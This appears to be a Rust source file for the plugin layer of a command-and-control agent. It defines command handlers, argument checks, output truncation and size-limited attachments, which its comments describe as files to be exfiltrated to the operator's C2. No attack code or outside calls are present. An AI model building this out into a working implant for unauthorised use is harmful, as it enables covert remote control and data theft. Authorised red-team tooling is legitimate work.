use std::error::Error;
use std::fmt;
use std::path::PathBuf;

pub type PluginError = Box<dyn Error + Send + Sync>;
pub type PluginResult = Result<(), PluginError>;

/// Largest payload a plugin may hand back as an attachment. Keeps one command
/// from exhausting the agent's memory or wedging a beacon.
pub const MAX_ATTACHMENT_BYTES: usize = 32 * 1024 * 1024;

/// Largest stdout a plugin may return. Longer output is truncated, because a
/// `cat /dev/zero` would otherwise hang the beacon loop forever.
pub const MAX_OUTPUT_BYTES: usize = 1024 * 1024;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CommandOutput {
    pub stdout: String,
    pub exit_code: i32,
    /// Binary payload produced by the command, shipped to the C2 as a file.
    pub attachment: Option<Attachment>,
}

impl CommandOutput {
    pub fn new(stdout: impl Into<String>) -> Self {
        Self {
            stdout: stdout.into(),
            exit_code: 0,
            attachment: None,
        }
    }

    pub fn with_exit_code(mut self, code: i32) -> Self {
        self.exit_code = code;
        self
    }

    pub fn with_attachment(mut self, attachment: Attachment) -> Self {
        self.attachment = Some(attachment);
        self
    }

    /// Builds a failure result that still carries a message for the operator.
    pub fn failure(message: impl Into<String>) -> Self {
        Self {
            stdout: message.into(),
            exit_code: 1,
            attachment: None,
        }
    }
}

/// A file a command produced, ready to be exfiltrated.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Attachment {
    pub name: String,
    pub data: Vec<u8>,
}

impl Attachment {
    /// Builds an attachment, rejecting empty names and oversized payloads.
    pub fn new(name: impl Into<String>, data: Vec<u8>) -> Result<Self, PluginError> {
        let name = sanitize_attachment_name(&name.into());
        if data.is_empty() {
            return Err("attachment is empty".into());
        }
        if data.len() > MAX_ATTACHMENT_BYTES {
            return Err(format!(
                "attachment is {} bytes, limit is {MAX_ATTACHMENT_BYTES}",
                data.len()
            )
            .into());
        }
        Ok(Self { name, data })
    }

    pub fn len(&self) -> usize {
        self.data.len()
    }

    pub fn is_empty(&self) -> bool {
        self.data.is_empty()
    }
}

/// Strips directories and control characters so a plugin cannot choose where
/// the file lands on the operator's machine.
pub fn sanitize_attachment_name(name: &str) -> String {
    let base = name.rsplit(['/', '\\']).next().unwrap_or(name).trim();
    let cleaned: String = base
        .chars()
        .map(|c| if c.is_control() { '_' } else { c })
        .collect();
    let cleaned = cleaned.replace("..", "_");
    if cleaned.is_empty() || cleaned.chars().all(|c| c == '_' || c == '.') {
        "attachment".to_string()
    } else {
        cleaned
    }
}

/// Truncates text to `limit` bytes on a char boundary, marking that it was cut.
pub fn truncate_output(text: &str, limit: usize) -> String {
    if text.len() <= limit {
        return text.to_string();
    }
    let mut end = limit;
    while end > 0 && !text.is_char_boundary(end) {
        end -= 1;
    }
    let mut out = text[..end].to_string();
    out.push_str(&format!("\n[truncated: {} bytes total]", text.len()));
    out
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct PluginMetadata {
    pub id: &'static str,
    pub version: &'static str,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum LifecycleEvent {
    Startup,
    Shutdown,
}

/// How many positional arguments a command takes. Validation happens before the
/// handler runs, so a handler never has to check arity itself.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Arity {
    /// Any number of arguments.
    Any,
    /// Exactly this many.
    Exactly(usize),
    /// At least this many.
    AtLeast(usize),
    /// Between these, inclusive.
    Between(usize, usize),
}

impl Arity {
    pub fn accepts(self, count: usize) -> bool {
        match self {
            Self::Any => true,
            Self::Exactly(n) => count == n,
            Self::AtLeast(n) => count >= n,
            Self::Between(lo, hi) => count >= lo && count <= hi,
        }
    }

    pub fn describe(self) -> String {
        match self {
            Self::Any => "any number of arguments".to_string(),
            Self::Exactly(1) => "1 argument".to_string(),
            Self::Exactly(n) => format!("{n} arguments"),
            Self::AtLeast(n) => format!("at least {n} argument(s)"),
            Self::Between(lo, hi) => format!("{lo} to {hi} arguments"),
        }
    }
}

/// What a handler gets to work with. Everything a command needs to be testable
/// without touching the real machine lives here.
#[derive(Debug, Clone)]
pub struct CommandContext {
    pub command: String,
    pub args: Vec<String>,
    /// Directory the agent is currently working in.
    pub cwd: PathBuf,
    /// Platform the agent was compiled for, as `std::env::consts::OS` spells it.
    pub platform: &'static str,
}

impl CommandContext {
    pub fn new(command: impl Into<String>, args: Vec<String>, cwd: PathBuf) -> Self {
        Self {
            command: command.into(),
            args,
            cwd,
            platform: std::env::consts::OS,
        }
    }

    pub fn arg(&self, index: usize) -> Option<&str> {
        self.args.get(index).map(String::as_str)
    }

    /// Resolves a path argument against the tracked cwd. Windows drive paths
    /// (`C:\...`) count as absolute even when built on another platform.
    pub fn resolve(&self, path: &str) -> PathBuf {
        let candidate = PathBuf::from(path);
        if candidate.is_absolute() || is_drive_path(path) {
            candidate
        } else {
            self.cwd.join(candidate)
        }
    }
}

fn is_drive_path(path: &str) -> bool {
    let bytes = path.as_bytes();
    bytes.len() >= 2 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':'
}

/// Handler signature. A plain closure, so adding a command needs no struct.
pub type Handler = Box<dyn FnMut(&mut CommandContext) -> Result<CommandOutput, PluginError> + Send>;

/// One command: its name, help text, arity and handler.
pub struct CommandSpec {
    pub name: &'static str,
    pub summary: &'static str,
    pub usage: &'static str,
    pub arity: Arity,
    handler: Handler,
}

impl fmt::Debug for CommandSpec {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter
            .debug_struct("CommandSpec")
            .field("name", &self.name)
            .field("arity", &self.arity)
            .finish_non_exhaustive()
    }
}

impl CommandSpec {
    pub fn new(
        name: &'static str,
        summary: &'static str,
        usage: &'static str,
        arity: Arity,
        handler: impl FnMut(&mut CommandContext) -> Result<CommandOutput, PluginError> + Send + 'static,
    ) -> Self {
        Self {
            name,
            summary,
            usage,
            arity,
            handler: Box::new(handler),
        }
    }

    /// Convenience constructor for commands that take anything.
    pub fn simple(
        name: &'static str,
        summary: &'static str,
        handler: impl FnMut(&mut CommandContext) -> Result<CommandOutput, PluginError> + Send + 'static,
    ) -> Self {
        Self::new(name, summary, name, Arity::Any, handler)
    }

    pub fn call(&mut self, ctx: &mut CommandContext) -> Result<CommandOutput, PluginError> {
        (self.handler)(ctx)
    }

    /// Validates arity and returns the message to show when it fails.
    pub fn check_arity(&self, count: usize) -> Result<(), String> {
        if self.arity.accepts(count) {
            Ok(())
        } else {
            Err(format!(
                "usage: {} (expected {})",
                self.usage,
                self.arity.describe()
            ))
        }
    }
}

pub trait Plugin: Send {
    fn metadata(&self) -> PluginMetadata;
    fn on_event(&mut self, event: LifecycleEvent) -> PluginResult;

    /// Names this plugin answers to. The registry routes on these.
    fn command_names(&self) -> Vec<&'static str> {
        Vec::new()
    }

    /// Runs one command. The registry has already checked that this plugin
    /// claims the name, so a missing command here is a plugin bug.
    fn execute(&mut self, ctx: &mut CommandContext) -> Result<CommandOutput, PluginError>;

    /// Help lines for every command this plugin exposes.
    fn help_lines(&self) -> Vec<(&'static str, &'static str)> {
        Vec::new()
    }
}

/// Fluent builder so a plugin is a list of commands, not a trait boilerplate.
///
/// ```ignore
/// PluginBuilder::new("net", "0.1.0")
///     .command("ping", "ping a host", Arity::Exactly(1), |ctx| {
///         Ok(CommandOutput::new(format!("would ping {}", ctx.args[0])))
///     })
///     .build()
/// ```
pub struct PluginBuilder {
    id: &'static str,
    version: &'static str,
    commands: Vec<CommandSpec>,
}

impl PluginBuilder {
    pub fn new(id: &'static str, version: &'static str) -> Self {
        Self {
            id,
            version,
            commands: Vec::new(),
        }
    }

    pub fn command(
        mut self,
        name: &'static str,
        summary: &'static str,
        arity: Arity,
        handler: impl FnMut(&mut CommandContext) -> Result<CommandOutput, PluginError> + Send + 'static,
    ) -> Self {
        self.commands.push(CommandSpec::new(
            name,
            summary,
            name,
            arity,
            handler,
        ));
        self
    }

    /// Adds a command with an explicit usage string, for help output.
    pub fn command_with_usage(
        mut self,
        name: &'static str,
        summary: &'static str,
        usage: &'static str,
        arity: Arity,
        handler: impl FnMut(&mut CommandContext) -> Result<CommandOutput, PluginError> + Send + 'static,
    ) -> Self {
        self.commands
            .push(CommandSpec::new(name, summary, usage, arity, handler));
        self
    }

    pub fn build(self) -> DeclarativePlugin {
        DeclarativePlugin {
            id: self.id,
            version: self.version,
            commands: self.commands,
        }
    }
}

/// The plugin a [`PluginBuilder`] produces.
pub struct DeclarativePlugin {
    id: &'static str,
    version: &'static str,
    commands: Vec<CommandSpec>,
}

impl DeclarativePlugin {
    pub fn spec(&self, name: &str) -> Option<&CommandSpec> {
        self.commands.iter().find(|c| c.name == name)
    }
}

impl Plugin for DeclarativePlugin {
    fn metadata(&self) -> PluginMetadata {
        PluginMetadata {
            id: self.id,
            version: self.version,
        }
    }

    fn on_event(&mut self, _event: LifecycleEvent) -> PluginResult {
        Ok(())
    }

    fn command_names(&self) -> Vec<&'static str> {
        self.commands.iter().map(|c| c.name).collect()
    }

    fn execute(&mut self, ctx: &mut CommandContext) -> Result<CommandOutput, PluginError> {
        let name = ctx.command.clone();
        let Some(spec) = self.commands.iter_mut().find(|c| c.name == name) else {
            return Err(format!("plugin '{}' has no command '{name}'", self.id).into());
        };
        spec.check_arity(ctx.args.len())?;
        spec.call(ctx)
    }

    fn help_lines(&self) -> Vec<(&'static str, &'static str)> {
        self.commands.iter().map(|c| (c.usage, c.summary)).collect()
    }
}
